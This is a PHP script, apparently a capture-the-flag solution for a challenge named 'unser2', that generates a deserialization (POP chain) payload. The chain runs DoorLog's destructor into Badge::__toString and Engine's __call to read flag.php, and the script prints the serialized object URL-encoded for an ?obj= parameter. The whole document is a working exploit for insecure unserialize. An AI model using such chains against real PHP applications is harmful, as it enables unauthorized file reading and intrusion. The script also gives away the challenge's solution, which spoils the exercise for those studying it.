<?php
// unser2 · POP 链 payload 生成器（与题目 classes.php 共用同一份类定义，永不长度出错）
// 用法：php gen_payload.php            输出 urlencode 后可直接拼接 ?obj= 的 payload
//       php gen_payload.php raw        输出原始序列化串
require __DIR__ . '/classes.php';

$log = new DoorLog();
$badge = new Badge();
$engine = new Engine();

$engine->allow = ['render' => 1];   // __call 白名单放行 render
$engine->cmd = 'flag.php';          // sink 要读的文件
$badge->template = $engine;         // toString → 调 Engine::render() → __call
$log->name = $badge;                // destruct 拼接 → Badge 当字符串 → __toString

$payload = serialize($log);
if (($argv[1] ?? '') === 'raw') {
    echo $payload, PHP_EOL;
} else {
    echo urlencode($payload), PHP_EOL;
}
